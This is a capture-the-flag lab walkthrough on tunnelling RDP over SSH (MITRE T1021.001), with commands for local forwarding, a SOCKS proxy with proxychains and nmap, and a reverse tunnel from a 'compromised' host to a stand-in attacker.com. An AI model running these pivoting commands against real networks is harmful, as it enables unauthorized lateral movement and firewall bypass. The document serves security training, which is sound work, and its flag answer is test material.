# T1021.001 – RDP via SSH Tunneling | Solution Walkthrough
**Difficulty:** Hard | **OS:** Linux | **MITRE:** T1021.001

## Background
When RDP (port 3389) is blocked by firewall but SSH is open, attackers tunnel RDP over SSH.

## Step 1 – Local Port Forward
```bash
# Forward local port 13389 → localhost:3389 through SSH pivot:
ssh -L 13389:localhost:3389 -N -f pivot_user@localhost
# -L = local forward, -N = no command, -f = background
# Now localhost:13389 reaches the internal RDP service!
```

## Step 2 – Connect RDP via Tunnel
```bash
xfreerdp /v:127.0.0.1:13389 /u:player /p:Player@123!
```

## Step 3 – Dynamic SOCKS Proxy (Route All Traffic)
```bash
# Create SOCKS5 proxy on port 1080:
ssh -D 1080 -N -f pivot_user@localhost
# Configure proxychains:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
# Now route any tool through the tunnel:
proxychains nmap -sT <internal_host>
proxychains xfreerdp /v:<internal_rdp_host> /u:admin
```

## Step 4 – Remote Port Forward (Reverse Tunnel)
```bash
# From compromised internal host — expose internal service to attacker:
ssh -R 13389:internal_rdp:3389 attacker@attacker.com
# Now attacker can reach internal RDP at attacker.com:13389
```

## Retrieve Flag
```bash
sudo cat /root/.flags/flag.txt
# HACKTIFY{RDP_SSH_TUNNEL_<hash>}
```
